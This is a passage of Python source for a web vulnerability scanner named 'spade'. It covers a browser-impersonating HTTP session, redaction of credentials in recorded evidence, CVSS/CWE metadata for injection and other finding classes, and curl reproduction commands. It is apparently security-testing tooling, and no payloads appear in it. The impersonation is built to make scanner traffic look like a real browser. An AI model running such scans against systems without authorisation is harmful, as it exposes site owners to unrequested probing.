#!/usr/bin/env python3
"""
spade — Automated Web Vulnerability Scanner v3
================================================================
Cara pakai:
  python3 spade.py example.com                    # standard (default)
  python3 spade.py example.com --quick             # quick check
  python3 spade.py example.com --detailed          # full scan
  python3 spade.py example.com -o laporan.html     # custom output
  python3 spade.py example.com --csv hasil.csv     # export CSV
"""

import argparse
import csv
import hashlib
import html as htmlmod
import json
import re
import socket
import ssl
import sys
import threading
import time
import typing
import urllib.parse
from collections import OrderedDict, defaultdict, namedtuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from html.parser import HTMLParser

try:
    from curl_cffi.requests import BrowserType, BrowserTypeLiteral
    from curl_cffi.requests import Session as CurlSession
except ImportError:
    print("[!] Butuh 'curl_cffi'. Install: pip3 install curl_cffi")
    sys.exit(1)

# ── color ──
C = {
    "reset": "\033[0m", "bold": "\033[1m", "dim": "\033[2m",
    "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
    "bg_red": "\033[41m", "white": "\033[97m",
}
DISABLE_COLOR = False

_OUTPUT_LOCAL = threading.local()

def c(code, t):
    return t if DISABLE_COLOR else f"{C.get(code,'')}{t}{C['reset']}"

def _emit(line):
    """Tulis ke stdout, atau ke buffer thread-local saat modul dijalankan paralel."""
    buf = getattr(_OUTPUT_LOCAL, "buf", None)
    if buf is not None:
        buf.append(line + "\n")
    else:
        print(line)

def info(m):   _emit(f"  {c('blue','[*]')} {m}")
def good(m):   _emit(f"  {c('green','[v]')} {m}")
def warn(m):   _emit(f"  {c('yellow','[!]')} {m}")
def err(m):    _emit(f"  {c('red','[x]')} {m}")
def critical(m): _emit(f"  {c('bg_red',c('white','[!!]'))} {c('red',m)}")

_CTX_LOCK = threading.Lock()

def ctx_get(ctx, key, producer):
    """Cache hasil request yang mahal di dalam ctx agar tidak diulang antar modul."""
    if ctx is None:
        return producer()
    with _CTX_LOCK:
        if key in ctx:
            return ctx[key]
    value = producer()
    with _CTX_LOCK:
        ctx.setdefault(key, value)
    return ctx[key]

def get_base_response(sess, base_url, ctx=None):
    """GET halaman utama sekali, lalu pakai ulang di modul-modul pasif."""
    def _fetch():
        try:
            return sess.get(base_url, timeout=10)
        except Exception:
            return None
    return ctx_get(ctx, ("base_response", base_url), _fetch)

# ── helpers ──
def normalize_url(url):
    url = url.strip()
    if not re.match(r"^https?://", url, re.I):
        url = "https://" + url
    p = urllib.parse.urlparse(url)
    return f"{p.scheme}://{p.netloc}{p.path or '/'}"

def host_from_url(url): return urllib.parse.urlparse(url).netloc
def scheme_from_url(url): return urllib.parse.urlparse(url).scheme

def join(base, path):
    if path.startswith(("http://","https://")): return path
    return urllib.parse.urljoin(base, path)

# ── HTTP layer (curl_cffi) ──
DEFAULT_IMPERSONATE = "chrome"     # profil default: Chrome terbaru yang didukung curl_cffi
TRANSPORT_RETRIES = 1              # retry error koneksi/DNS/TLS (ditangani curl_cffi)
STATUS_RETRIES = 1                 # retry status 429/5xx (ditangani ThreadLocalSession)
RETRY_STATUS = frozenset({429, 500, 502, 503, 504})
RETRY_METHODS = frozenset({"GET", "POST", "HEAD", "OPTIONS"})
RETRY_AFTER_MAX = 5.0              # batas tunggu Retry-After agar scan tidak macet
_DEFAULT = object()                # sentinel: bedakan "pakai default" dari "tanpa impersonate"


def supported_impersonate_profiles():
    """Daftar profil yang diterima curl_cffi untuk --impersonate.

    Sumbernya BrowserTypeLiteral (mencakup nama berversi seperti 'chrome146'
    sekaligus alias generik seperti 'chrome' = Chrome terbaru), ditambah nama
    dari enum BrowserType sebagai cadangan untuk versi lama curl_cffi.
    """
    profiles = set(typing.get_args(BrowserTypeLiteral))
    profiles.update(m.name for m in BrowserType)
    return sorted(profiles)


def _retry_after_seconds(value):
    """Ubah header Retry-After (detik atau HTTP-date) jadi durasi tunggu, dibatasi RETRY_AFTER_MAX."""
    if not value:
        return 0.0
    value = value.strip()
    try:
        return max(0.0, min(float(value), RETRY_AFTER_MAX))
    except ValueError:
        pass
    try:
        from email.utils import parsedate_to_datetime
        stamp = parsedate_to_datetime(value)
        if stamp is None:
            return 0.0
        delta = (stamp - datetime.now(stamp.tzinfo)).total_seconds()
        return max(0.0, min(delta, RETRY_AFTER_MAX))
    except Exception:
        return 0.0


def make_session(timeout=15, verify_ssl=True, impersonate=_DEFAULT):
    """Buat satu curl_cffi Session dengan browser impersonation.

    User-Agent, sec-ch-ua, sec-fetch-*, dan Accept-Language tidak diset manual:
    nilainya berasal dari profil impersonate agar fingerprint TLS + header sama
    seperti browser asli (menyetel UA manual justru merusak paritas tersebut).
    Retry untuk error transport ditangani curl_cffi sendiri, sedangkan retry
    berdasarkan status HTTP (429/5xx) ditangani wrapper ThreadLocalSession.

    impersonate=None berarti impersonation dimatikan (mode paritas/debugging).
    """
    profile = DEFAULT_IMPERSONATE if impersonate is _DEFAULT else impersonate
    kwargs = {"timeout": timeout, "verify": verify_ssl, "retry": TRANSPORT_RETRIES}
    if profile:
        kwargs["impersonate"] = profile
    return CurlSession(**kwargs)

# ══════════════════════════════════════════════════════════════════
# EVIDENCE — rekaman request/response sebagai bukti temuan
# ══════════════════════════════════════════════════════════════════

SPADE_VERSION = "3.1"

EVIDENCE_SNIPPET_CHARS = 500        # potongan respons di HTML & CSV
EVIDENCE_SNIPPET_CHARS_JSON = 2000  # potongan respons di JSON
EVIDENCE_MAX_KEYS = 512             # batas entri indeks bukti (per tipe indeks)
EVIDENCE_MAX_THREADS = 64           # batas entri indeks "request terakhir per thread"

# Redaksi aktif secara default: cookie, token, dan password tidak boleh ikut
# tersimpan di memori proses maupun di laporan hasil scan.
REDACT_ENABLED = True
REDACT_PLACEHOLDER = "***REDACTED***"
REDACTED_HEADERS = frozenset({
    "cookie", "set-cookie", "authorization", "proxy-authorization",
    "x-api-key", "x-csrf-token", "x-xsrf-token", "x-auth-token",
})
REDACT_BODY_KEY_RE = re.compile(
    r"pass|pwd|secret|token|api[_-]?key|auth|csrf|xsrf|session|otp|pin|credential", re.I
)

class Exchange:
    """Satu pasang request/response yang sudah di-redaksi, siap jadi bukti temuan.

    Dibuat otomatis di funnel `ThreadLocalSession.request()` supaya setiap
    temuan bisa menyertakan bukti asli (method, URL, status, header, body
    request, dan potongan respons) tanpa mengubah call site modul.
    """

    __slots__ = ("method", "url", "status", "request_headers", "request_body",
                 "response_headers", "response_snippet", "response_length",
                 "content_type", "elapsed_ms", "timestamp")

    def __init__(self, method, url, status, request_headers=None, request_body=None,
                 response_headers=None, response_snippet="", response_length=0,
                 content_type="", elapsed_ms=0.0, timestamp=None, redact=None):
        # Redaksi dilakukan di sini (bukan hanya saat serialisasi) supaya objek
        # Exchange yang dibuat langsung oleh pemanggil lain tidak pernah menyimpan
        # header/body/URL mentah berisi kredensial.
        self.method = (method or "GET").upper()
        self.url = redact_url(url or "", redact)
        self.status = status
        self.request_headers = redact_headers(request_headers, redact)
        self.request_body = redact_body(request_body, redact)
        self.response_headers = redact_headers(response_headers, redact)
        self.response_snippet = response_snippet or ""
        self.response_length = response_length or 0
        self.content_type = content_type or ""
        self.elapsed_ms = round(float(elapsed_ms or 0.0), 1)
        self.timestamp = timestamp or datetime.now().isoformat(timespec="seconds")

    @property
    def path(self):
        return urllib.parse.urlparse(self.url).path or "/"

    def to_dict(self, snippet_chars=EVIDENCE_SNIPPET_CHARS_JSON, redact=True):
        snippet = self.response_snippet
        truncated = len(snippet) > snippet_chars
        if truncated:
            snippet = snippet[:snippet_chars]
        return {
            "url": redact_url(self.url, redact),
            "method": self.method,
            "status": self.status,
            "content_type": self.content_type,
            "elapsed_ms": self.elapsed_ms,
            "timestamp": self.timestamp,
            "request_headers": self.request_headers,
            "request_body": self.request_body,
            "response_status": self.status,
            "response_length": self.response_length,
            "response_snippet": snippet,
            "response_truncated": truncated,
        }

    def __repr__(self):
        return f"Exchange({self.method} {self.url} -> {self.status})"

def _mask_header_value(name, value):
    """Sensor nilai header sensitif, tapi pertahankan bentuknya (mis. `sid=***`)."""
    if name.lower() in ("cookie", "set-cookie"):
        chunks = []
        for chunk in str(value).split(";"):
            chunk = chunk.strip()
            if "=" in chunk:
                chunks.append(f"{chunk.split('=', 1)[0]}={REDACT_PLACEHOLDER}")
            elif chunk:
                chunks.append(chunk)
        return "; ".join(chunks) if chunks else REDACT_PLACEHOLDER
    return REDACT_PLACEHOLDER

def redact_headers(headers, enabled=None):
    """Sensor header sensitif (Cookie/Authorization/API key) dari dict header."""
    if enabled is None:
        enabled = REDACT_ENABLED
    out = {}
    for name, value in (headers or {}).items():
        if enabled and name.lower() in REDACTED_HEADERS:
            out[name] = _mask_header_value(name, value)
        else:
            out[name] = value
    return out

def _redact_json_value(value):
    if isinstance(value, dict):
        return {k: (REDACT_PLACEHOLDER if REDACT_BODY_KEY_RE.search(str(k)) else _redact_json_value(v))
                for k, v in value.items()}
    if isinstance(value, list):
        return [_redact_json_value(v) for v in value]
    return value

def redact_body(body, enabled=None):
    """Sensor nilai field sensitif pada body request (form-urlencoded atau JSON)."""
    if enabled is None:
        enabled = REDACT_ENABLED
    if not enabled or body is None:
        return body
    if isinstance(body, (dict, list)):
        # Call site kadang sudah mengirim dict ke `data=`/`json=`; sensor
        # langsung struktur aslinya, jangan lewat repr Python (kunci sensitif
        # di repr tetap terbaca sebagai teks biasa).
        return json.dumps(_redact_json_value(body), ensure_ascii=False)
    text = body.decode("utf-8", "replace") if isinstance(body, bytes) else str(body)
    stripped = text.strip()
    if not stripped:
        return text
    if stripped[0] in "{[":
        try:
            return json.dumps(_redact_json_value(json.loads(stripped)), ensure_ascii=False)
        except ValueError:
            return text
    if "=" in stripped and not stripped.startswith("<"):
        chunks = []
        for chunk in stripped.split("&"):
            if "=" in chunk:
                key, _sep, _value = chunk.partition("=")
                chunks.append(f"{key}={REDACT_PLACEHOLDER}" if REDACT_BODY_KEY_RE.search(key) else chunk)
            else:
                chunks.append(chunk)
        return "&".join(chunks)
    return text

def redact_url(url, enabled=None):
    """Sensor nilai query parameter sensitif (mis. `?token=...`) di URL.

    Parameter yang tidak sensitif dibiarkan apa adanya (tidak di-encode ulang)
    supaya URL di laporan tetap identik dengan yang benar-benar dikirim.
    """
    if enabled is None:
        enabled = REDACT_ENABLED
    if not enabled or not url or "?" not in url:
        return url
    head, _sep, rest = url.partition("?")
    fragment = ""
    if "#" in rest:
        rest, _sep, fragment = rest.partition("#")
        fragment = "#" + fragment
    if not rest:
        return url
    masked = []
    for chunk in rest.split("&"):
        key, sep, _value = chunk.partition("=")
        if sep and REDACT_BODY_KEY_RE.search(urllib.parse.unquote_plus(key)):
            masked.append(f"{key}={REDACT_PLACEHOLDER}")
        else:
            masked.append(chunk)
    return head + "?" + "&".join(masked) + fragment

_EVIDENCE_LOCK = threading.Lock()
_EVIDENCE_BY_KEY = OrderedDict()          # (method, url) -> Exchange (terbaru menang)
_EVIDENCE_BY_PATH = OrderedDict()         # (method, path) -> Exchange
_EVIDENCE_LAST_BY_THREAD = {}             # thread id -> Exchange terakhir
EVIDENCE_BASE_URL = None                  # base URL scan, dipakai sebagai fallback

def set_evidence_base_url(url):
    """Tandai base URL scan sebagai fallback bukti untuk temuan tanpa URL."""
    global EVIDENCE_BASE_URL
    EVIDENCE_BASE_URL = url

def reset_evidence():
    """Bersihkan indeks bukti (dipakai di awal scan agar tidak bocor antar run/test)."""
    with _EVIDENCE_LOCK:
        _EVIDENCE_BY_KEY.clear()
        _EVIDENCE_BY_PATH.clear()
        _EVIDENCE_LAST_BY_THREAD.clear()
    set_evidence_base_url(None)

def record_exchange(exchange):
    """Simpan satu Exchange ke indeks bukti berbatas ukuran."""
    if exchange is None or not exchange.url:
        return exchange
    thread_id = threading.get_ident()
    with _EVIDENCE_LOCK:
        # Dua indeks terpisah supaya GET /a dan POST /a tidak saling menimpa:
        # kunci URL penuh untuk lookup persis, kunci path untuk fallback longgar.
        _remember(_EVIDENCE_BY_KEY, (exchange.method, exchange.url), exchange)
        _remember(_EVIDENCE_BY_PATH, (exchange.method, exchange.path), exchange)
        _EVIDENCE_LAST_BY_THREAD[thread_id] = exchange
        while len(_EVIDENCE_LAST_BY_THREAD) > EVIDENCE_MAX_THREADS:
            _EVIDENCE_LAST_BY_THREAD.pop(next(iter(_EVIDENCE_LAST_BY_THREAD)))
    return exchange

def _remember(index, key, exchange):
    """Simpan exchange ke OrderedDict berbatas, entri terlama dibuang lebih dulu."""
    index[key] = exchange
    index.move_to_end(key)
    while len(index) > EVIDENCE_MAX_KEYS:
        index.popitem(last=False)

def _lookup_by_url(url, method=None):
    """Cari exchange untuk URL ini; kalau `method` diberi, hanya cocokkan method itu."""
    if method:
        found = _EVIDENCE_BY_KEY.get((method.upper(), url))
        if found is not None:
            return found
    for (known_method, known_url), exchange in reversed(_EVIDENCE_BY_KEY.items()):
        if known_url == url:
            if method is None or known_method == method.upper():
                return exchange
    return None

def _lookup_by_path(path, method=None):
    """Cari exchange untuk path ini (tanpa query/host)."""
    if method:
        found = _EVIDENCE_BY_PATH.get((method.upper(), path))
        if found is not None:
            return found
    for (known_method, known_path), exchange in reversed(_EVIDENCE_BY_PATH.items()):
        if known_path == path:
            if method is None or known_method == method.upper():
                return exchange
    return None

def evidence_for(url=None, method=None):
    """Cari bukti request/response untuk sebuah temuan.

    Urutan pencarian: (method, URL) persis -> URL apa pun -> (method, path) ->
    path apa pun -> request terakhir di thread ini -> respons base URL scan ->
    None. Fallback ke "request terakhir di thread" penting karena banyak modul
    meng-append temuan langsung setelah request pemicunya di thread yang sama.
    """
    thread_id = threading.get_ident()
    with _EVIDENCE_LOCK:
        if url:
            found = _lookup_by_url(url, method) or _lookup_by_url(url)
            if found is not None:
                return found
            path = urllib.parse.urlparse(url).path or "/"
            found = _lookup_by_path(path, method) or _lookup_by_path(path)
            if found is not None:
                return found
        found = _EVIDENCE_LAST_BY_THREAD.get(thread_id)
        if found is not None:
            return found
        if EVIDENCE_BASE_URL:
            found = _lookup_by_url(EVIDENCE_BASE_URL) or _lookup_by_path(
                urllib.parse.urlparse(EVIDENCE_BASE_URL).path or "/")
            if found is not None:
                return found
    return None

def exchange_from_response(resp, method, elapsed_ms=0.0, kwargs=None, session_cookies=None):
    """Ubah Response curl_cffi menjadi Exchange yang sudah di-redaksi.

    `session_cookies` adalah isi cookie jar milik session yang dipakai. Cookie
    dikirim oleh curl di level engine (tidak muncul di `resp.request.headers`),
    jadi ditambahkan ke header bukti supaya langkah reproduksi temuan pada
    halaman terautentikasi tetap masuk akal — nilainya tetap disensor oleh
    `redact_headers()`.
    """
    kwargs = kwargs or {}
    request = getattr(resp, "request", None)
    request_headers = {}
    for source in (getattr(request, "headers", None), kwargs.get("headers")):
        if source:
            request_headers.update(dict(source))
    if session_cookies and not any(name.lower() == "cookie" for name in request_headers):
        jar = "; ".join(f"{name}={value}" for name, value in session_cookies)
        if jar:
            request_headers["Cookie"] = jar
    body = getattr(request, "body", None)
    if body is None:
        body = kwargs.get("data")
        if body is None:
            body = kwargs.get("json")
            if body is not None and not isinstance(body, (str, bytes)):
                body = json.dumps(body, ensure_ascii=False)
    if isinstance(body, bytes):
        body = body.decode("utf-8", "replace")
    raw = getattr(resp, "content", b"") or b""
    if not isinstance(raw, (bytes, bytearray)):
        raw = str(raw).encode("utf-8", "replace")
    if isinstance(raw, str):
        raw = raw.encode("utf-8", "replace")
    response_headers = dict(getattr(resp, "headers", None) or {})
    snippet = raw[:EVIDENCE_SNIPPET_CHARS_JSON * 4].decode("utf-8", "replace")[:EVIDENCE_SNIPPET_CHARS_JSON]
    return Exchange(
        method=method,
        url=str(getattr(resp, "url", "") or ""),
        status=getattr(resp, "status_code", None),
        request_headers=request_headers,
        request_body=body,
        response_headers=response_headers,
        response_snippet=snippet,
        response_length=len(raw),
        content_type=str(response_headers.get("Content-Type", "")),
        elapsed_ms=elapsed_ms,
    )

# ══════════════════════════════════════════════════════════════════
# FINDING — model temuan (kompatibel dengan tuple lama)
# ══════════════════════════════════════════════════════════════════

FindingMeta = namedtuple("FindingMeta", "vector score cwe owasp confidence")

_CVSS_NO_SCOPE_CHANGE = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U"

# Skor CVSS di tabel ini adalah skor referensi per kelas temuan (bukan hasil
# pengukuran runtime) dan dihitung dari vector CVSS 3.1 yang tertulis.
# Label severity Spade tetap jadi prioritas operasional; keduanya bisa berbeda.
FINDING_META = {
    "SENSITIVE_FILE":       FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-538", "A01:2021", "certain"),
    "PHP_INFO":             FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A05:2021", "firm"),
    "DIR_LISTING":          FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-548", "A01:2021", "firm"),
    "HTTP_METHOD":          FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:N/I:H/A:N", 7.5, "CWE-650", "A01:2021", "firm"),
    "TRACE_ENABLED":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-749", "A05:2021", "firm"),
    "SQLI":                 FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-89", "A03:2021", "firm"),
    "XSS_REFLECTED":        FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-79", "A03:2021", "firm"),
    "XSS_POST":             FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-79", "A03:2021", "firm"),
    "XSS_STORED":           FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-79", "A03:2021", "tentative"),
    "LFI":                  FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-22", "A01:2021", "firm"),
    "CMD_INJECTION":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "firm"),
    "CMD_INJECTION_POST":   FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "firm"),
    "SSRF":                 FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-918", "A10:2021", "tentative"),
    "SSRF_FORM":            FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-918", "A10:2021", "tentative"),
    "SSRF_TIMEOUT":         FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N", 3.7, "CWE-918", "A10:2021", "tentative"),
    "OPEN_REDIRECT":        FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", 6.1, "CWE-601", "A01:2021", "firm"),
    "XXE_DIRECT":           FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-611", "A05:2021", "firm"),
    "XXE_FORM":             FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-611", "A05:2021", "firm"),
    "SSTI":                 FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-1336", "A03:2021", "firm"),
    "NOSQLI":               FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-943", "A03:2021", "tentative"),
    "GRAPHQL_INTROSPECTION": FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A01:2021", "firm"),
    "JS_SECRET":            FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", 8.6, "CWE-798", "A07:2021", "firm"),
    "JWT_ALG_NONE":         FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:N", 9.1, "CWE-347", "A07:2021", "certain"),
    "CORS_WILDCARD":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-942", "A05:2021", "firm"),
    "CORS_WILDCARD_CRED":   FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N", 8.1, "CWE-942", "A05:2021", "firm"),
    "CORS_REFLECT":         FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", 4.3, "CWE-942", "A05:2021", "tentative"),
    "TLS_EXPIRING":         FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-298", "A02:2021", "firm"),
    "TLS_EXP_SOON":         FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N", 3.7, "CWE-298", "A02:2021", "firm"),
    "TLS_CERT_ERR":         FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", 7.4, "CWE-295", "A02:2021", "firm"),
    "SERVER_LEAK":          FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A05:2021", "firm"),
    "XPOWERED_LEAK":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A05:2021", "firm"),
    "COOKIE_ISSUE":         FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-614", "A05:2021", "firm"),
    "FORM_HTTP":            FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-319", "A02:2021", "firm"),
    # Temuan informasional: tidak ada skor CVSS yang berlaku, tapi CWE/OWASP tetap dipetakan.
    "TECH":                 FindingMeta(None, 0.0, "CWE-200", "A05:2021", "firm"),
    "JS_APIS":              FindingMeta(None, 0.0, "CWE-200", "A01:2021", "firm"),
    "ROBOTS":               FindingMeta(None, 0.0, "CWE-200", "A01:2021", "tentative"),
    "SUBDOMAINS":           FindingMeta(None, 0.0, "CWE-200", "A01:2021", "tentative"),
    "JWT_COOKIE":           FindingMeta(None, 0.0, "CWE-522", "A07:2021", "firm"),
    "JWT_BEARER":           FindingMeta(None, 0.0, "CWE-522", "A07:2021", "firm"),
    "RATE_LIMIT":           FindingMeta(None, 0.0, "CWE-770", "A04:2021", "firm"),
    "NO_RATE_LIMIT":        FindingMeta(None, 0.0, "CWE-770", "A04:2021", "tentative"),
    "SCAN_ERROR":           FindingMeta(None, 0.0, None, None, "certain"),
}

# Keluarga kode dinamis: MISS_* (header tidak diset), HDR_* (header terpasang),
# WEAK_* (protokol/kriptografi lemah).
META_PREFIX_RULES = (
    ("MISS_", FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-693", "A05:2021", "certain")),
    ("HDR_", FindingMeta(None, 0.0, "CWE-693", "A05:2021", "certain")),
    ("WEAK_", FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-327", "A02:2021", "certain")),
)

# Kode yang buktinya belum cukup untuk disebut pasti, apa pun kata tabel meta.
TENTATIVE_CODES = frozenset({
    "SSRF", "SSRF_FORM", "SSRF_TIMEOUT", "CORS_REFLECT", "XSS_STORED",
    "ROBOTS", "SUBDOMAINS", "NO_RATE_LIMIT",
})

CONFIDENCE_LEVELS = ("certain", "firm", "tentative")

def finding_meta(code):
    """Metadata CVSS/CWE/OWASP/confidence untuk satu kode temuan.

    Kode yang belum dipetakan mengembalikan None — vector CVSS tidak pernah
    dikarang untuk kode yang tidak dikenal.
    """
    if not code:
        return None
    meta = FINDING_META.get(code)
    if meta is not None:
        return meta
    for prefix, prefix_meta in META_PREFIX_RULES:
        if code.startswith(prefix):
            return prefix_meta
    return None

def cvss_of(meta):
    """Payload CVSS `{"vector": ..., "score": ...}` untuk sebuah FindingMeta.

    Kembalikan None kalau meta tidak ada atau vector-nya kosong (temuan
    informasional), supaya laporan tidak salah menampilkan "skor 0.0".
    """
    if meta is None or not meta.vector:
        return None
    return {"vector": meta.vector, "score": meta.score}

def finding_confidence(code, declared=None):
    """Tingkat keyakinan temuan: certain/firm/tentative."""
    if declared:
        base = declared
    else:
        meta = finding_meta(code)
        base = meta.confidence if meta else "firm"
    if code in TENTATIVE_CODES and base != "tentative":
        return "tentative"
    return base

def make_finding_id(code, url, desc):
    """ID temuan yang stabil antar scan: sha256(code|url|desc) 12 karakter pertama."""
    raw = "|".join([code or "", url or "", desc or ""])
    return "spade-" + hashlib.sha256(raw.encode("utf-8")).hexdigest()[:12]

def _shell_quote(value):
    return "'" + str(value).replace("'", "'\\''") + "'"

REPRO_SKIP_HEADERS = frozenset({"content-length", "host", "accept-encoding"})

def repro_curl(exchange, impersonate=DEFAULT_IMPERSONATE, redact=None):
    """Bangun langkah reproduksi dari satu Exchange.

    Mengembalikan dict `{"curl": ..., "python_curl_cffi": ...}`. Perintah `curl`
    portabel dipakai sebagai PoC utama; snippet `curl_cffi` disertakan supaya
    fingerprint browser (impersonate) scan bisa direplikasi. Nilai cookie selalu
    diganti placeholder — cookie hasil scan tidak valid untuk pembaca laporan.
    """
    if exchange is None:
        return {"curl": "", "python_curl_cffi": ""}
    if redact is None:
        redact = REDACT_ENABLED
    url = redact_url(exchange.url, redact)
    headers = dict(exchange.request_headers or {})
    header_args = []
    py_headers = {}
    content_type = ""
    for name, value in headers.items():
        lowered = name.lower()
        if lowered == "cookie":
            py_headers[name] = "COOKIE_ANDA"
            header_args.append(f"-H {_shell_quote(f'{name}: COOKIE_ANDA')}")
            continue
        if lowered in REPRO_SKIP_HEADERS:
            continue
        if lowered == "content-type":
            content_type = str(value)
        py_headers[name] = value
        header_args.append(f"-H {_shell_quote(f'{name}: {value}')}")
    body = exchange.request_body or ""
    segments = ["curl -sS -i", f"-X {exchange.method}"] + header_args
    if body:
        segments.append(f"--data-raw {_shell_quote(body)}")
    segments.append(_shell_quote(url))
    curl_command = " ".join(segments)
    py_kwargs = [f"impersonate={impersonate!r}", "timeout=15"]
    if py_headers:
        py_kwargs.append(f"headers={py_headers!r}")
    if body:
        payload = body
        if "json" in content_type.lower():
            try:
                payload = json.loads(body)
                py_kwargs.append(f"json={payload!r}")
            except ValueError:
                py_kwargs.append(f"data={payload!r}")
        else:
            py_kwargs.append(f"data={payload!r}")
    py_snippet = "\n".join([
        "from curl_cffi import requests",
        f"r = requests.{exchange.method.lower()}({url!r}, {', '.join(py_kwargs)})",
        "print(r.status_code, len(r.content))",
    ])
    return {"curl": curl_command, "python_curl_cffi": py_snippet}

class Finding:
    """Temuan dengan bukti + metadata, tetap kompatibel dengan tuple lama.

    Iterasi, `len()`, indexing, dan perbandingan tetap memakai bentuk lama
    `(sev, code, desc, url)` supaya modul dan report yang sudah ada tidak perlu
    diubah. Attribute tambahan: `evidence`, `confidence`, `meta`, `finding_id`.
    """

    __slots__ = ("sev", "code", "desc", "url", "evidence", "confidence", "meta", "finding_id")

    def __init__(self, sev, code, desc, url=None, evidence=None, confidence=None, meta=None, finding_id=None):
        self.sev = sev
        self.code = code
        self.desc = desc
        self.url = url
        self.evidence = evidence
        self.meta = finding_meta(code) if meta is None else meta
        self.confidence = finding_confidence(code, confidence)
        self.finding_id = finding_id or make_finding_id(code, url, desc)

    def _key(self):
        return (self.sev, self.code, self.desc, self.url)

    def __getitem__(self, index):
        return self._key()[index]

    def __len__(self):
        return 4

    def __iter__(self):
        return iter(self._key())

    def __eq__(self, other):
        if isinstance(other, Finding):
            return self._key() == other._key()
        if isinstance(other, tuple):
            return self._key()[:len(other)] == tuple(other)
        return NotImplemented

    def __hash__(self):
        return hash(self._key())

    def __repr__(self):
        return f"Finding({self.sev!r}, {self.code!r}, url={self.url!r})"

    def to_dict(self, snippet_chars=EVIDENCE_SNIPPET_CHARS_JSON, redact=None, impersonate=None):
        """Serialisasi satu temuan untuk laporan JSON."""
        if redact is None:
            redact = REDACT_ENABLED
        meta = self.meta
        return {
            "id": self.finding_id,
            "severity": self.sev,
            "code": self.code,
            "description": self.desc,
            "url": redact_url(self.url, redact) if self.url else self.url,
            "confidence": self.confidence,
            "cvss": cvss_of(meta),
            "cwe": meta.cwe if meta else None,
            "owasp": meta.owasp if meta else None,
            "evidence": self.evidence.to_dict(snippet_chars, redact) if self.evidence else None,
            "repro": repro_curl(self.evidence, impersonate or DEFAULT_IMPERSONATE, redact),
        }

def as_finding(item):
    """Normalisasi tuple lama atau Finding menjadi Finding."""
    if isinstance(item, Finding):
        return item
    values = list(item) if isinstance(item, (tuple, list)) else [item]
    values = (values + [None, None, None, None])[:4]
    return Finding(values[0], values[1], values[2], values[3])

class FindingList(list):
    """List temuan yang otomatis mengubah tuple lama menjadi Finding + menempelkan bukti.

    `default_evidence_url` dipakai kalau temuan tidak punya URL sendiri (modul
    pasif seperti security headers). `capture=False` untuk modul yang memang
    tidak menembak HTTP (mis. pemeriksaan TLS via socket).
    """

    def __init__(self, default_evidence_url=None, capture=True, iterable=()):
        super().__init__()
        self.default_evidence_url = default_evidence_url
        self.capture = capture
        if iterable:
            self.extend(iterable)

    def append(self, item, evidence_url=_DEFAULT, evidence=None, confidence=None):
        # `evidence_url=None` eksplisit berarti "temuan ini tidak punya request
